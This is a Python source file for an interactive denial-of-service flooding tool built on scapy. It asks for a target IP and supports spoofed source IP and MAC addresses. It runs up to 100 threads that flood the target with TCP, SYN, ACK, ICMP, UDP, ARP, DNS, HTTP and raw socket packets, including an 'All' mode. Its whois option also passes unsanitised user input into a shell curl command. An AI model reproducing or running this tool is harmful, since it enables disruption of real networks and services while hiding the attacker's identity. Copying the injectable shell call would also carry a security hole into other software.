import os
import sys
import threading
import string
import random

try:
    from scapy.layers.dns import DNS
    from scapy.layers.http import HTTP
    from scapy.layers.inet import TCP, IP, ICMP, UDP, whois
    from scapy.layers.l2 import Ether, ARP
    from scapy.sendrecv import send
    from scapy.packet import Raw
except ImportError:
    print(os.name)
    if sys.platform.startswith("win"):
        os.system("python -m pip install scapy")
    else:
        os.system("python3 -m pip install scapy")
    try:
        from scapy.layers.dns import DNS
        from scapy.packet import Raw
        from scapy.layers.http import HTTP
        from scapy.layers.inet import TCP, IP, ICMP, UDP
        from scapy.layers.l2 import Ether, ARP
        from scapy.sendrecv import send
    except ImportError:
        print("Can't install scapy")
        exit()

try:
    import socket
except ImportError:
    if sys.platform.startswith("win"):
        os.system("python -m pip install sockets")
    else:
        os.system("python3 -m pip install sockets")
    try:
        import socket
    except ImportError:
        print("Can't install socket")
        exit()

try:
    import dns.resolver, dns.reversename
except ImportError:
    if sys.platform.startswith("win"):
        os.system("python -m pip install dnspython")
    else:
        os.system("python3 -m pip install dnspython")
    try:
        import dns.resolver, dns.reversename
    except ImportError:
        print("Can't install dnspython lib")
        exit()

try:
    import requests
except ImportError:
    if sys.platform.startswith("win"):
        os.system("python -m pip install requests")
    else:
        os.system("python3 -m pip install requests")
    try:
        import requests
    except ImportError:
        print("Can't install requests")
        exit()

targetIP = None
dstPort = None
spoofIP = None
spoofMAC = None
threads = None
srcPort = None
amount = None


def setAmount():
    global amount
    while True:
        amount = input("{+} Amount of maximum sent packets (Optional) [Press enter for none]: ")
        if amount == "":
            break
        elif amount.isdigit():
            amount = int(amount)
            break
        else:
            print('Only numbers!')


def setSrcPort():
    global srcPort
    while True:
        srcPort = input("{+} Source Port (Optional) [Press enter for default port 25]: ")
        if srcPort == "":
            srcPort = 25
            break
        else:
            isInt = False
            try:
                srcPort = int(srcPort)
                isInt = True
            except Exception:
                print("Only numbers!")
            if isInt:
                break


def setThreads():
    global threads
    while True:
        threads = input("{+} Threads (Optional) [Press enter for default threads 100]: ")
        if threads == "":
            threads = 100
            break
        elif threads.isdigit():
            threads = int(threads)
            break
        else:
            print('Only numbers!')


def setSpoofIP():
    global spoofIP
    while True:
        spoofIP = input("{+} Spoof src IP (Optional) [Press enter for none]: ")
        if spoofIP == "127.0.0.1":
            print("This wont work the way you want to.")
        else:
            break


def setSpoofMAC():
    global spoofMAC
    spoofMAC = input("{+} Spoof src MAC (Optional) [Press enter for none]: ")


def setTargetIP():
    global targetIP
    while True:
        targetIP = input("{+} Target public IP: ")
        if targetIP != "":
            break
        if targetIP == "127.0.0.1":
            print("This is local IP. It may not work.")
            break


def setDstPort():
    global dstPort
    while True:
        dstPort = input("{+} Destination Port (Optional) [Press enter for default port 25]: ")
        if dstPort == "":
            dstPort = 25
            break
        else:
            isInt = False
            try:
                dstPort = int(dstPort)
                isInt = True
            except Exception:
                print("Only numbers!")
            if isInt:
                break


def IPtoDNS():
    global targetIP, addrs
    try:
        addrs = dns.reversename.from_address(targetIP)
        print("Address: " + str(addrs))
        print("DNS: " + str(dns.resolver.resolve(addrs, "PTR")[0]))
    except Exception:
        print("Unknown host")


def attack(p):
    num = 0
    current_thread = threading.current_thread()
    while True:
        try:
            send(p, verbose=False)
            if amount != "" and num == amount:
                print("Limit reached!")
                break
            num += 1
            print(f"{current_thread.name} 's thread have sent {num} packets.")
        except KeyboardInterrupt:
            print("CTRL+C detected. Attack stopped.")
            break


def DoS():
    protocols = """
    1 - TCP
    2 - TCP SYN
    3 - TCP ACK
    4 - ICMP
    5 - UDP
    6 - ARP
    7 - DNS
    8 - HTTP
    9 - SOCKET
    10 - All
    """
    print(protocols)
    while True:
        mode = input("{?} Protocol: ")
        b = input("{?} Bytes ( the text you will give will be encoded in UTF-8 format ) ( press enter for NULL bytes ) : ")
        way = input(f"[?] {targetIP} IPv4 / IPv6 (4 or 6): ")
        random_bytes = input("{?} Random Bytes ( Y/N ): ")
        daemon_threads = input("{?} Daemon Threads ( Y/N ): ")
        if mode != "" and way != "" and random_bytes != "" and daemon_threads != "":
            try:
                mode = int(mode)
                if b != "":
                    b = b.encode("utf-8")
                way = int(way)
                random_bytes = True if random_bytes.lower() in ["y", "yes"] else False
                daemon_threads = True if daemon_threads.lower() in ["y", "yes"] else False
            except Exception as e:
                print(e)
                continue
            else:
                break
    if spoofIP == "":
        ip = requests.get('https://api.ipify.org').text

    else:
        ip = spoofIP

    if spoofMAC != "":
        etherPacket = Ether(src=spoofMAC)

    else:
        etherPacket = Ether()

    ipPacket = IP(dst=targetIP, src=ip)
    packetSize = Raw(load=b)

    if mode == 1:
        if b == "":
            tcp = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort)
        else:
            tcp = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort) / packetSize
        if threads:
            for t in range(threads):
                if random_bytes:
                    if b == "":
                        tcp = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort)
                    else:
                        tcp = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort) / Raw(load=''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(1,100))))
                threading.Thread(target=attack, args=[tcp], daemon=daemon_threads).start()

    elif mode == 2:
        if b == "":
            tcpSYN = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='S')
        else:
            tcpSYN = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='S') / packetSize
        if threads:
            for t in range(threads):
                if random_bytes:
                    if b == "":
                        tcpSYN = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='S')
                    else:
                        tcpSYN = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='S') / Raw(load=''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(1,100))))
                threading.Thread(target=attack, args=[tcpSYN], daemon=daemon_threads).start()

    elif mode == 3:
        if b == "":
            tcpACK = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='A')
        else:
            tcpACK = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='A') / packetSize
        if threads:
            for t in range(threads):
                if random_bytes:
                    if b == "":
                        tcpACK = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='A')
                    else:
                        tcpACK = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='A') / Raw(load=''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(1,100))))
                threading.Thread(target=attack, args=[tcpACK], daemon=daemon_threads).start()

    elif mode == 4:
        if b == "":
            icmp = etherPacket / ipPacket / ICMP()
        else:
            icmp = etherPacket / ipPacket / ICMP() / packetSize
        if threads:
            for t in range(threads):
                if random_bytes:
                    if b == "":
                        icmp = etherPacket / ipPacket / ICMP()
                    else:
                        icmp = etherPacket / ipPacket / ICMP() / Raw(load=''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(1,100))))
                threading.Thread(target=attack, args=[icmp], daemon=daemon_threads).start()

    elif mode == 5:
        if b == "":
            udp = etherPacket / ipPacket / UDP(dport=dstPort, sport=srcPort)
        else:
            udp = etherPacket / ipPacket / UDP(dport=dstPort, sport=srcPort) / packetSize
        if threads:
            for t in range(threads):
                if random_bytes:
                    if b == "":
                        udp = etherPacket / ipPacket / UDP(dport=dstPort, sport=srcPort)
                    else:
                        udp = etherPacket / ipPacket / UDP(dport=dstPort, sport=srcPort) / Raw(load=''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(1,100))))
                threading.Thread(target=attack, args=[udp], daemon=daemon_threads).start()

    elif mode == 6:
        if b == "":
            arp = etherPacket / ipPacket / ARP()
        else:
            arp = etherPacket / ipPacket / ARP() / packetSize
        if threads:
            for t in range(threads):
                if random_bytes:
                    if b == "":
                        arp = etherPacket / ipPacket / ARP()
                    else:
                        arp = etherPacket / ipPacket / ARP() / Raw(load=''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(1,100))))
                threading.Thread(target=attack, args=[arp], daemon=daemon_threads).start()

    elif mode == 7:
        if b == "":
            dns = etherPacket / ipPacket / DNS()
        else:
            dns = etherPacket / ipPacket / DNS() / packetSize
        if threads:
            for t in range(threads):
                if random_bytes:
                    if b == "":
                        dns = etherPacket / ipPacket / DNS()
                    else:
                        dns = etherPacket / ipPacket / DNS() / Raw(load=''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(1,100))))
                threading.Thread(target=attack, args=[dns], daemon=daemon_threads).start()

    elif mode == 8:
        if b == "":
            http = etherPacket / ipPacket / HTTP()
        else:
            http = etherPacket / ipPacket / HTTP() / packetSize
        if threads:
            for t in range(threads):
                if random_bytes:
                    if b == "":
                        http = etherPacket / ipPacket / HTTP()
                    else:
                        http = etherPacket / ipPacket / HTTP() / Raw(load=''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(1,100))))
                threading.Thread(target=attack, args=[http], daemon=daemon_threads).start()

    elif mode == 9:
        if way == 4:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        else:
            sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)

        num = 0
        while True:
            try:
                sock.sendto(b, (targetIP, dstPort))
                if num == amount:
                    print("Limit reached!")
                    break
                num += 1
                print(num)
            except KeyboardInterrupt:
                print("CTRL+C detected. Attack stopped.")
                break
    elif mode == 10:
        http = etherPacket / ipPacket / HTTP() / packetSize
        dns = etherPacket / ipPacket / DNS() / packetSize
        arp = etherPacket / ipPacket / ARP() / packetSize
        udp = etherPacket / ipPacket / UDP(dport=dstPort, sport=srcPort) / packetSize
        icmp = etherPacket / ipPacket / ICMP() / packetSize
        tcpACK = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='A') / packetSize
        tcpSYN = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='S') / packetSize
        tcp = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort) / packetSize
        if way == 4:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        else:
            sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
        num = 0
        while True:
            try:
                send(tcp, verbose=False)
                send(tcpSYN, verbose=False)
                send(tcpACK, verbose=False)
                send(icmp, verbose=False)
                send(udp, verbose=False)
                send(arp, verbose=False)
                send(dns, verbose=False)
                send(http, verbose=False)
                sock.sendto(b, (targetIP, dstPort))
                if num == amount:
                    print("Limit reached!")
                    break
                num += 1
                print(num)
            except KeyboardInterrupt:
                print("CTRL+C detected. Attack stopped.")
                break



setTargetIP()
setSpoofIP()
setSpoofMAC()
setSrcPort()
setDstPort()
setThreads()
setAmount()


def Menu():
    menu = f"""
        target: {targetIP}
        spoofed src IP: {spoofIP}
        spoofed src MAC: {spoofMAC}
        dst port: {dstPort}
        src port: {srcPort}
        threads: {threads}
        amount: {amount}
        
        1 - DoS
        2 - IP to Domain
        3 - Change targetIP
        4 - Change dst port
        5 - Change spoof src IP
        6 - Change threads
        7 - Change src port
        8 - Change amount
        9 - Change spoof src MAC
        10 - lookup whois
        """
    print(menu)


Menu()

while True:
    mode = input(" {?} What do you choose: ").lower()
    if mode == "":
        continue
    if mode == "help" or mode == 'h':
        Menu()
        continue
    if mode.isdigit():
        mode = int(mode)
        if mode == 1:
            DoS()
        elif mode == 2:
            IPtoDNS()
        elif mode == 3:
            setTargetIP()
        elif mode == 4:
            setDstPort()
        elif mode == 5:
            setSpoofIP()
        elif mode == 6:
            setThreads()
        elif mode == 7:
            setSrcPort()
        elif mode == 8:
            setAmount()
        elif mode == 9:
            setSpoofMAC()
        elif mode == 10:
            while True:
                ip = input("{?} IP: ")
                if ip != "":
                    break
            print(whois(ip))
            os.system("curl https://ipwhois.app/json/" + ip)
    else:
        print("Only numbers")
